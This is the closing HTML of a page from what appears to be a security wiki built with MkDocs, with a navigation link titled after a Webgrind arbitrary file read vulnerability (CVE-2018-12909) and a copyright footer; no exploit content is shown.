        Previous</a><a href="../../Webgrind/Webgrind%20fileviewer.phtml%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2018-12909/" class="btn btn-xs btn-link">
        Webgrind fileviewer.phtml 任意文件读取漏洞 CVE-2018-12909
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>